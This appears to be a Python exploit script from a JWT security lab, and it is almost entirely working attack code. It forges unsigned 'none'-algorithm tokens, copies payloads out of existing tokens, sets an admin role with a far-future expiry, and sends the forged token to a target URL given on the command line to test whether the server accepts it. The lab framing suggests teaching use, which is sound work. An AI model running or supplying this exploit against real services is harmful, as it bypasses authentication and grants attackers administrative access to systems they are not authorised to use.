#!/usr/bin/env python3
"""
JWT Lab - None Algorithm Attack Exploit

This script demonstrates creating a JWT token with 'none' algorithm.
"""

import jwt
import json
import base64
import sys
import requests

def create_none_token(token=None, payload=None):
    """Create a token using the 'none' algorithm."""
    
    if token and not payload:
        # Decode the payload from an existing token without verification
        parts = token.split('.')
        if len(parts) != 3:
            print("[-] Invalid token format.")
            return None
        
        # Decode the payload (middle part)
        try:
            payload_bytes = base64.urlsafe_b64decode(parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4))
            payload = json.loads(payload_bytes.decode('utf-8'))
        except Exception as e:
            print(f"[-] Error decoding payload: {e}")
            return None
    
    if not payload:
        # Default payload if none provided
        payload = {
            "userId": "1234567890",
            "username": "user",
            "role": "admin",
            "exp": 2000000000  # Far future expiration
        }
    
    # Create a header with 'none' algorithm
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    
    # Encode header and payload
    header_bytes = json.dumps(header, separators=(',', ':')).encode('utf-8')
    header_b64 = base64.urlsafe_b64encode(header_bytes).decode('utf-8').rstrip('=')
    
    payload_bytes = json.dumps(payload, separators=(',', ':')).encode('utf-8')
    payload_b64 = base64.urlsafe_b64encode(payload_bytes).decode('utf-8').rstrip('=')
    
    # Create token with empty signature (important: keep the trailing dot)
    none_token = f"{header_b64}.{payload_b64}."
    
    return none_token

def exploit_none_alg(url, token=None, payload=None):
    """Exploit the none algorithm vulnerability by sending a request."""
    
    none_token = create_none_token(token, payload)
    if not none_token:
        return
    
    print(f"[+] Generated 'none' algorithm token: {none_token}")
    
    try:
        # Send request to the vulnerable endpoint
        headers = {"Authorization": f"Bearer {none_token}"}
        response = requests.get(url, headers=headers)
        
        print(f"[+] Response status code: {response.status_code}")
        print(f"[+] Response body: {response.text}")
        
        if response.status_code == 200:
            print("[+] Exploit successful! The server accepted the 'none' algorithm token.")
        else:
            print("[-] Exploit failed. The server rejected the 'none' algorithm token.")
    
    except Exception as e:
        print(f"[-] Error during exploit: {e}")

def modify_payload(token, **changes):
    """Modify the payload of an existing token."""
    
    # Decode the token parts
    parts = token.split('.')
    if len(parts) != 3:
        print("[-] Invalid token format.")
        return None
    
    try:
        # Decode header and payload
        header_bytes = base64.urlsafe_b64decode(parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4))
        header = json.loads(header_bytes.decode('utf-8'))
        
        payload_bytes = base64.urlsafe_b64decode(parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4))
        payload = json.loads(payload_bytes.decode('utf-8'))
        
        # Apply changes to payload
        for key, value in changes.items():
            payload[key] = value
        
        return payload
    
    except Exception as e:
        print(f"[-] Error decoding token: {e}")
        return None

def print_usage():
    print("Usage:")
    print("  1. Create a 'none' algorithm token:")
    print("     python none_algorithm.py create [token_to_copy_payload_from]")
    print()
    print("  2. Exploit a vulnerable endpoint:")
    print("     python none_algorithm.py exploit <url> [token_to_copy_payload_from]")
    print()
    print("  3. Create with custom payload fields:")
    print("     python none_algorithm.py custom <username> <role>")
    print()
    print("Examples:")
    print("  python none_algorithm.py create")
    print("  python none_algorithm.py create eyJhbGciOiJIUzI1...existing_token...")
    print("  python none_algorithm.py exploit http://localhost:3000/api/none-alg")
    print("  python none_algorithm.py custom john admin")

def main():
    if len(sys.argv) < 2 or sys.argv[1] in ["-h", "--help"]:
        print_usage()
        sys.exit(1)
    
    action = sys.argv[1]
    
    if action == "create":
        # Create a 'none' algorithm token
        if len(sys.argv) > 2:
            token = sys.argv[2]
            none_token = create_none_token(token)
        else:
            none_token = create_none_token()
        
        if none_token:
            print(f"[+] 'None' algorithm token: {none_token}")
    
    elif action == "exploit":
        # Exploit a vulnerable endpoint
        if len(sys.argv) < 3:
            print("[-] Please provide a URL to exploit.")
            print("    Example: python none_algorithm.py exploit http://localhost:3000/api/none-alg")
            sys.exit(1)
        
        url = sys.argv[2]
        token = sys.argv[3] if len(sys.argv) > 3 else None
        exploit_none_alg(url, token)
    
    elif action == "custom":
        # Create a 'none' algorithm token with custom payload
        if len(sys.argv) < 4:
            print("[-] Please provide username and role.")
            print("    Example: python none_algorithm.py custom john admin")
            sys.exit(1)
        
        username = sys.argv[2]
        role = sys.argv[3]
        
        payload = {
            "userId": "1234567890",
            "username": username,
            "role": role,
            "exp": 2000000000
        }
        
        none_token = create_none_token(payload=payload)
        if none_token:
            print(f"[+] Custom 'none' algorithm token: {none_token}")
    
    else:
        print(f"[-] Unknown action: {action}")
        print_usage()
        sys.exit(1)

if __name__ == "__main__":
    main() 